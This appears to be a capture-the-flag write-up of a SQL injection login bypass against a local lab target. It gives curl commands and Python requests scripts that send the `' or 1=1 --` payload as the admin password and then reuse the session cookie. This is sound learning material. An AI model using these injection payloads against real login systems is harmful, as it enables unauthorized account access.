# SQLi 2

#### Send a request with the guest login. 

```curl -v -d “login-name=guest&pword=password” http://challenge.localhost:80/auth```

----------------------------------------

#### Same as last challenge, cookie and redirect. However, the password bypass no longer works. Since the request is expecting more after the injection, just need to comment that out using -- :

```curl -c cookie -d “login-name=admin&pword=‘ or 1=1 --“```

--------------------------------------

#### Rerun with cookie:

```curl -L -b cookie "http://challenge.localhost:80/auth"```

---------------------------------------

#### Or the python version, set it up to be reusable:
```python
import requests

path = “/auth”
url = f”http://challenge.localhost{path}”

data = {
“login-name”: “admin”,
“pword”: “' or 1=1 --”
}

r = requests.post(url=url, data=data)
print(r.text)
```
```python3 requesting.py```

------------------------------------------

#### Or in terminal:

```Python```
```
>>> import requests
>>> url = "http://challenge.localhost/auth"
>>> data = {"login-name":"admin", "pword":"' or 1=1 --"}
>>> r = requests.post(url=url, data=data)
>>> print(r.text)
```
